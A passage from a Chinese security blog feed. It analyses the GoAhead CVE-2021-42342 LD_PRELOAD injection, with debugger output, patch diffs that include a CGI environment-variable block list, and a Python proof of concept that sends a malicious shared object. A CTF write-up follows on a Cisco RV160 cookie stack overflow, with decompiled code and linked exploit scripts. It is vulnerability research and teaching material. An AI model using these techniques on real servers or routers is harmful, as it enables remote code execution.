http://127.0.0.1:8080/cgi-bin/test.cgi\n</span><br></pre></td></tr></table></figure><h3 id="找不到文件描述符"><a href="#找不到文件描述符" class="headerlink" title="找不到文件描述符"></a>找不到文件描述符</h3><p>在使用如上 Dockerfile 作为环境的漏洞利用过程中，会发现劫持 so 的过程会有如下报错</p><ul><li><code>ERROR: ld.so: object &#39;/proc/self/fd/7&#39; from LD_PRELOAD cannot be preloaded (file too short): ignored.</code></li><li><code>ERROR: ld.so: object &#39;/proc/self/fd/5&#39; from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.</code></li><li><code>ERROR: ld.so: object &#39;/proc/self/fd/2&#39; from LD_PRELOAD cannot be preloaded (invalid ELF header): ignored.</code></li></ul><p>经过调试和代码阅读分析了，大致原因如下：</p><p>当最后一个包被处理的时候，即进到 <code>upload.c#processContentData</code> 函数中</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091727107.png" title="image-20220109172745897" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091727107.png" alt="image-20220109172745897"></a></p><p>即 334 行代码处，进入到 <code>get</code> 函数中，此函数逻辑为判断是否读到 upload 数据的结束符号，即 <code>boundary </code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────</span><br><span class="line">In file: &#x2F;usr&#x2F;src&#x2F;src&#x2F;upload.c</span><br><span class="line">   419     while (cp &lt; endp) &#123;</span><br><span class="line">   420         cp &#x3D; (char *) memchr(cp, first, endp - cp);</span><br><span class="line">   421         if (!cp) &#123;</span><br><span class="line">   422             return 0;</span><br><span class="line">   423         &#125;</span><br><span class="line"> ► 424         if (memcmp(cp, wp-&gt;boundary, wp-&gt;boundaryLen) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">   425             return cp;</span><br><span class="line">   426         &#125;</span><br><span class="line">   427         cp++;</span><br><span class="line">   428     &#125;</span><br><span class="line">   429     return 0;</span><br><span class="line">───────────────────────────────────────[ STACK ]────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7ffcd8eca3e0 —▸ 0x7ffcd8eca410 —▸ 0x5590f9adce48 ◂— &#39;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">01:0008│     0x7ffcd8eca3e8 ◂— 0x2f &#x2F;* &#39;&#x2F;&#39; *&#x2F;</span><br><span class="line">02:0010│     0x7ffcd8eca3f0 —▸ 0x5590f9adce3f ◂— &#39;aaaaaa\n\r\n--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">03:0018│     0x7ffcd8eca3f8 —▸ 0x5590f9adb790 —▸ 0x5590f9add5d0 ◂— 0x67632f0054534f00</span><br><span class="line">04:0020│     0x7ffcd8eca400 —▸ 0x7ffcd8eca410 —▸ 0x5590f9adce48 ◂— &#39;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">05:0028│     0x7ffcd8eca408 ◂— 0x2d005590f9adfd70</span><br><span class="line">06:0030│     0x7ffcd8eca410 —▸ 0x5590f9adce48 ◂— &#39;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">07:0038│     0x7ffcd8eca418 —▸ 0x5590f9adce4d ◂— &#39;4f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">─────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────</span><br><span class="line"> ► f 0   0x7fb0335a7429 getBoundary+206</span><br><span class="line">   f 1   0x7fb0335a7003 processContentData+109</span><br><span class="line">   f 2   0x7fb0335a66f7 websProcessUploadData+372</span><br><span class="line">   f 3   0x7fb03358f7d4 processContent+110</span><br><span class="line">   f 4   0x7fb03358e51b websPump+104</span><br><span class="line">   f 5   0x7fb03358e3b9 readEvent+352</span><br><span class="line">   f 6   0x7fb03358e142 socketEvent+159</span><br><span class="line">   f 7   0x7fb0335a3dbf socketDoEvent+197</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p cp</span><br><span class="line">$15 &#x3D; 0x5590f9adce48 &quot;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&quot;</span><br><span class="line">pwndbg&gt; p wp-&gt;boundary</span><br><span class="line">$16 &#x3D; 0x5590f9ad5a70 &quot;--1544f720d6ce5bdc5b81100af0acc3b5&quot;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>如果是则返回 <code>cp</code>, 因此，当正常的数据包的时候，此时 334 行的判断不成立，代码会往下走，最后走到 391 代码，close 调临时文件的 fd， 因此包含的时候会报错。</p><p>那么怎么解决这个问题呢？ phith0n 师傅文章中的解决方案如下：</p><blockquote><p>首先构造好之前那个无法利用的数据包，其中第一个表单字段是<code>LD_PRELOAD</code>，值是文件描述符，一般是<code>/proc/self/fd/7</code>。然后我们需要改造这个数据包：</p><ul><li>给payload.so文件末尾增加几千个字节的脏字符，比如说<code>a</code></li><li>关掉burpsuite自动的“Update Content-Length”</li><li>将数据包的Content-Length设置为不超过16384的值，但需要比payload.so文件的大小要大个500字节左右，我这里设置为15000</li></ul></blockquote><p>构造如下payload： </p><ol><li>Content-Length 小于总的 upload data 的大小</li><li>Content-Length 至少要大于 payload.so  的大小</li></ol><p>那么这个方法是如何生效的呢？ 当出发upload 后，到执行 cgi， 程序代码会调用<code>processContent</code>将处理post数据，将其保存到tmp文件中， 其代码如下：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091921124.png" title="image-20220109192138087" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091921124.png" alt="image-20220109192138087"></a></p><p>当 <code>wp-&gt;oef </code> 为假时， 程序会判断 post 的数据未读完，因此会进到 <code>filterChunkData</code> 函数中， 当程序判断数据已经读完，</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091939636.png" title="image-20220109193908584" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091939636.png" alt="image-20220109193908584"></a></p><p>即 <code>wp-&gt;rxRemainning &lt;=0</code> 后，会设置 <code>wp-&gt;eof</code>  的值为 1 。 这表明根据 数据已经接受完毕，然后走到 <code>upload.c:1216</code> 行, 调用 <code>websProcessUploadData </code> 函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091911961.png" title="image-20220109191114896" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091911961.png" alt="image-20220109191114896"></a></p><p>执行到如上图中到 145 行代码处，调用processContentData`函数，</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091944301.png" title="image-20220109194405252" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091944301.png" alt="image-20220109194405252"></a></p><p>由于我们设置的 Content-Length 小于总的数据包大小，因此我们是读不到 <code>Boundaray</code> ，因此这里 348 代码返回 0  。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091945836.png" title="image-20220109194525781" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091945836.png" alt="image-20220109194525781"></a></p><p><code>canProceed</code> 为零，从148 代码处返回到 http.c:1216 行。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091948266.png" title="image-20220109194835191" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091948266.png" alt="image-20220109194835191"></a></p><p>然后从 1218 行处代码返回到 http.c:867 行</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091949226.png" title="image-20220109194953182" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091949226.png" alt="image-20220109194953182"></a></p><p>接着 for 循环因为 canProceed 为 0 ，因此 break 退出循环。至此到这还没有调到 cgi ，但程序的数据已处理完一部分。 然后程序直接退回到 <code>readEvent</code>, 之后由于我们数据包并没有发送完， 还有一部分到脏数据未处理。代码又会走一遍</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socketEvent—&gt;readEvent-&gt;websPump-&gt;processContent</span><br></pre></td></tr></table></figure><p>当到 processContent 函数的时候，</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091955229.png" title="image-20220109195548187" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091955229.png" alt="image-20220109195548187"></a></p><p>1209 行代码不满足， 1239 行代码满足， 因此 <code>wp-&gt;state</code> 被设置为 WEBS_READY 。然后再 websPump 代码处执行 <code>websRunrequest</code>， 最后执行 CGI 。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091956842.png" title="image-20220109195658790" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091956842.png" alt="image-20220109195658790"></a></p><p><strong>总结</strong></p><ol><li>让程序没有读取到 boundary , 程序会觉得数据没有处理完， 因此不会 close 文件描述符</li><li>让程序认为剩下未读到数据， 不可能读到 boundary 了， 因此会再 http.c:1293 行处设置 wp-&gt;eof flag </li><li>保持链接的不中断， 程序会接着尝试读数据</li></ol><p>根据以上的分析以及之后的实践， 我们发现除了 phith0n  师傅的这种方法，其实还有其他方法，且不需要竞争</p><ol><li>两次发送数据，第一次发送需要 payload.so 发送且写入临时文件，且通过删除 boundary 让程序handle住，第二次发送劫持环境变量</li><li>一次发送， 只需删除 boundary 标志， 然后 sleep 后， 发送一次数据即可</li></ol><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p><a href="https://github.com/embedthis/goahead/commit/6906212c8db07265850e3870dbc97b541712e2c7">FIX: flag upload form vars as untrusted so they will be prefixed. · embedthis/goahead@6906212 (github.com)</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@@ -320,6 +320,7 @@ static bool processContentData(Webs *wp)</span><br><span class="line">&#123;</span><br><span class="line">    WebsUpload  *file;</span><br><span class="line">    WebsBuf     *content;</span><br><span class="line"><span class="addition">+    WebsKey     *sp;</span></span><br><span class="line">    ssize       size, nbytes, len;</span><br><span class="line">    char        *data, *bp;</span><br><span class="line"></span><br><span class="line">@@ -380,7 +381,9 @@ static bool processContentData(Webs *wp)</span><br><span class="line">            trace(5, &quot;uploadFilter: form[%s] = %s&quot;, wp-&gt;uploadVar, data);</span><br><span class="line">            websDecodeUrl(wp-&gt;uploadVar, wp-&gt;uploadVar, -1);</span><br><span class="line">            websDecodeUrl(data, data, -1);</span><br><span class="line"><span class="deletion">-           websSetVar(wp, wp-&gt;uploadVar, data);</span></span><br><span class="line"><span class="addition">+            sp = websSetVar(wp, wp-&gt;uploadVar, data);</span></span><br><span class="line"><span class="addition">+            //  Flag as untrusted so CGI will prefix</span></span><br><span class="line"><span class="addition">+            sp-&gt;arg = 1;</span></span><br><span class="line">        &#125;</span><br><span class="line">        websConsumeInput(wp, nbytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/embedthis/goahead/commit/5bc764136fc7adbeea419d8cd360ed407c555f07">FIX: trim CGI env vars for black list · embedthis/goahead@5bc7641 (github.com)</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@@ -173,10 +173,10 @@ PUBLIC bool cgiHandler(Webs *wp)</span><br><span class="line">    if (wp-&gt;vars) &#123;</span><br><span class="line">        for (n = 0, s = hashFirst(wp-&gt;vars); s != NULL; s = hashNext(wp-&gt;vars, s)) &#123;</span><br><span class="line">            if (s-&gt;content.valid &amp;&amp; s-&gt;content.type == string) &#123;</span><br><span class="line"><span class="deletion">-                vp = strim(s-&gt;name.value.string, 0, WEBS_TRIM_START);</span></span><br><span class="line"><span class="addition">+                vp = strim(s-&gt;name.value.string, &quot; \t\r\n&quot;, WEBS_TRIM_BOTH);</span></span><br><span class="line">                if (smatch(vp, &quot;REMOTE_HOST&quot;) || smatch(vp, &quot;HTTP_AUTHORIZATION&quot;) ||</span><br><span class="line">                    smatch(vp, &quot;IFS&quot;) || smatch(vp, &quot;CDPATH&quot;) ||</span><br><span class="line"><span class="deletion">-                    smatch(vp, &quot;PATH&quot;) || sstarts(vp, &quot;LD_&quot;)) &#123;</span></span><br><span class="line"><span class="addition">+                    smatch(vp, &quot;PATH&quot;) || sstarts(vp, &quot;PYTHONPATH&quot;) || sstarts(vp, &quot;LD_&quot;)) &#123;</span></span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                if (s-&gt;arg != 0 &amp;&amp; *ME_GOAHEAD_CGI_VAR_PREFIX != &#x27;\0&#x27;) &#123;</span><br></pre></td></tr></table></figure><p>修正了  strim 函数的正确使用，以及对文件上传处理同样加入了<code>sp-&gt;arg = 1</code>的处理</p><h2 id="找不到文件描述符-的问题补充"><a href="#找不到文件描述符-的问题补充" class="headerlink" title="找不到文件描述符 的问题补充"></a>找不到文件描述符 的问题补充</h2><p>update ： 2022/01/17 </p><p>@nepire 今天和我提了一个解决这个问题的另外一个方法 ， 我们简单回顾下代码</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171711335.png" title="image-20220117171150196" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171711335.png" alt="image-20220117171150196"></a></p><p>我们可以看到我们的临时文件是在 src/upload.c:342 行写入的，但是除了此处以为我们没有其他地方写临时文件了吗？搜索一下 <code>write\(.*fd</code> 写入文件的代码</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171720190.png" title="image-20220117172041121" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171720190.png" alt="image-20220117172041121"></a></p><p>我们找到另外一处文件描述符， <code>wp-&gt;cgifd</code> , 其写入的内容为 <code>wp-&gt;input.servp</code>,   那么我们如何保证 <code>wp-&gt;input.servp</code> 数据即为 ELF 的数据呢？</p><p>根据简单阅读代码, 即在 upload.c  代码中</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171801106.png" title="image-20220117180115037" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171801106.png" alt="image-20220117180115037"></a></p><p>在 upload 处理数据的过程中， 数据指针由 <code>bufCompact</code> 函数处理：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171803209.png" title="image-20220117180328157" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171803209.png" alt="image-20220117180328157"></a></p><p>该函数将此次读取的 数据由 <code>bp-&gt;servp</code> 拷贝到 <code>bp-&gt;buf</code>中， 然后在移动修改 <code>bp-&gt;servp</code> ， 当读取到 <code>Boundary</code>结束的时候，<code>bp-&gt;servp</code> 刚好指向了 <code>--------------------------6671c05704e869e7--</code> 的结尾处，因此我们只需在此处后面补充 ELF 数据即可</p><p>因此大致 PoC 如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">headers = <span class="string">&quot;&quot;&quot;POST /cgi-bin/test.cgi HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: localhost:8080\r</span></span><br><span class="line"><span class="string">Accept: */*\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=------------------------f74e4c2f448c9827\r</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">body = <span class="string">b&quot;&quot;&quot;--------------------------f74e4c2f448c9827</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;LD_PRELOAD&quot;\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">/dev/stdin\r</span></span><br><span class="line"><span class="string">--------------------------f74e4c2f448c9827--\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#/dev/stdin</span></span><br><span class="line"><span class="comment">#/proc/self/fd/0</span></span><br><span class="line"></span><br><span class="line">n = remote(ip,port)</span><br><span class="line">post = body + parse_so(<span class="string">&#x27;./poc.so&#x27;</span>)</span><br><span class="line">n.send(headers.format(len(post)).encode(<span class="string">&#x27;latin&#x27;</span>) + post)</span><br></pre></td></tr></table></figure><p>另外此时劫持的 fd 可以指向 0 或者 6， 因为在 launchCgi 函数中会重新 dup2 相关文件描述符。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171840954.png" title="image-20220117184055856" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171840954.png" alt="image-20220117184055856"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6407">CVE-2017-17562 GoAhead远程代码执行漏洞分析 - 先知社区 (aliyun.com)</a></p><p><a href="https://tttang.com/archive/1399/">GoAhead环境变量注入复现踩坑记 - 跳跳糖 (tttang.com)</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2021-42342" scheme="https://bestwing.me/tags/CVE-2021-42342/"/>
    
  </entry>
  
  <entry>
    <title>2021 TCTF iOA and RV Writeup</title>
    <link href="https://bestwing.me/2021-TCTF-RV-Writeup.html"/>
    <id>https://bestwing.me/2021-TCTF-RV-Writeup.html</id>
    <published>2021-07-05T16:00:00.000Z</published>
    <updated>2021-08-20T18:50:44.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末和r3kapig的小伙伴一起打了， 0CTF/TCTF 2021 Quals， 然后两天的时间都耗在了 iOA 和 RV 这两个题身上了。<br><a class="gallery-item"><img src=""></a>(<a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706110534.png">https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706110534.png</a>)</p><h2 id="iOA"><a href="#iOA" class="headerlink" title="iOA"></a>iOA</h2><p>这个题目，在 pizza 和 圣博 因为在拖着我的情况下做了好久才做出来， 最终拿了个二血。</p><p>题目实现了一个 sslvpn 协议栈，有几个漏洞点</p><p>（1）urlencode 可以绕过  ../ 的检查，导致跨目录文件读取， 可以读取 user.txt 的账号密码</p><p>   (2)  vip 的 bitmap 操作有负数越界操作， 可以访问bss上的内容, 读master_key，改dhcp_pool，用req_vip的整数截断leak canary，在req_vip里栈溢出。</p><p>相关文件可以这里获取；</p><ol><li><p>sslvpn idb</p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/iOA/sslvpnd.i64">http://bestwing.me/attachments/2021-TCTF-quals/iOA/sslvpnd.i64</a></p></li><li><p><a href="https://github.com/WinMin/WinMin.github.io/blob/master/attachments/2021-TCTF-quals/iOA/leak.py">leak.py</a></p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/iOA/leak.py">http://bestwing.me/attachments/2021-TCTF-quals/iOA/leak.py</a></p></li><li><p><a href="https://github.com/WinMin/WinMin.github.io/blob/master/attachments/2021-TCTF-quals/iOA/exploit.py">exploit.py</a></p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/iOA/exploit.py">http://bestwing.me/attachments/2021-TCTF-quals/iOA/exploit.py</a></p></li></ol><h2 id="RV"><a href="#RV" class="headerlink" title="RV"></a>RV</h2><p>题目描述：</p><blockquote><p>Cisco RV160 Router behind iOA!<br>remote version is <code>1.0.01.01</code>.<br><a href="http://10.1.1.1/">http://10.1.1.1</a></p></blockquote><p>这个题目呢， 是一个 Cisco RV160的 1day题，这题也是比较可惜的。其实能做出来的，因为之前我刚好也给思科报过 RV160的洞，是一个httpd上的栈溢出，刚好也是这个版本。但是打比赛的时候为了省事， 想用 cgi 的命令注入打， 没打成功，而且不管访问什么当时都是返回 403 错误，一度让我怀疑人生</p><p>赛后才知道， 由于主办方是 docker + qemu 启动的， 猜测导致有些环境变量有问题，因此在403 check 的时候过不去，因此根本到不了执行 cgi 的位置。</p><p>然后在这里我打算公开这个的漏洞的细节，以及在这个题目上的利用， 这个漏洞应该是去年报告的，编号为  CVE-2021-1293</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706115827.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706115827.png"></a></p><h3 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h3><p>在处理 cookie 的时候，会存在溢出栈溢出。</p><p>（1） 首先在 httpd handle 中， cookie 的指针会赋值到一个全局变量里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(s1, <span class="string">&quot;Cookie:&quot;</span>, <span class="number">7u</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  nptr = s1 + <span class="number">7</span>;</span><br><span class="line">  v11 = <span class="built_in">strspn</span>(s1 + <span class="number">7</span>, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">  nptr += v11;</span><br><span class="line">  Cookie = (<span class="keyword">int</span>)nptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2） 然后在 check_need_login 函数中, 会判断哪些 uri 需要登录    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v33 = check_need_login(v25);</span><br><span class="line"><span class="keyword">if</span> ( v33 )</span><br><span class="line">  v38 = check_Is_not_login_page((<span class="keyword">const</span> <span class="keyword">char</span> *)Cookie);</span><br><span class="line">v26 = <span class="built_in">printf</span>(<span class="string">&quot;=====is_login=%d, is_not_login_page=%d&quot;</span>, v38, v33);</span><br><span class="line"><span class="keyword">if</span> ( v39 || !v38 &amp;&amp; v33 )</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_need_login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !uri_string || !*(_BYTE *)uri_string )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;help&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;images/collapsed.png&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;cportal&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;index.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;login.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;alert0.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;confirm1.htm&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;check_is_not_login_page====res=%d&quot;</span>, v2);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如， 我访问  this_is_hack.htm ，这个url， 这个就符号需要登录的逻辑</p><p>(3) 然后 进入到 check_Is_not_login_page 函数中</p><p>在处理 sessionID 的过程中存在栈溢出漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_16138</span><span class="params">(<span class="keyword">char</span> *cookie, <span class="keyword">const</span> <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;get_session_id   session=%s&quot;</span>, cookie);</span><br><span class="line">  s1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(cookie, <span class="string">&quot;sessionID&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( s1 = strtok(cookie, <span class="string">&quot; &quot;</span>); s1; s1 = strtok(<span class="number">0</span>, <span class="string">&quot; &quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;sessionID&quot;</span>, <span class="number">9u</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_15CE4(s1, byte_1FCD4, <span class="string">&quot;=&quot;</span>, v6, v5);</span><br><span class="line">.......</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>判断 cookie 是否有 <code>sessionID</code> 字符串， 如果存在则进到  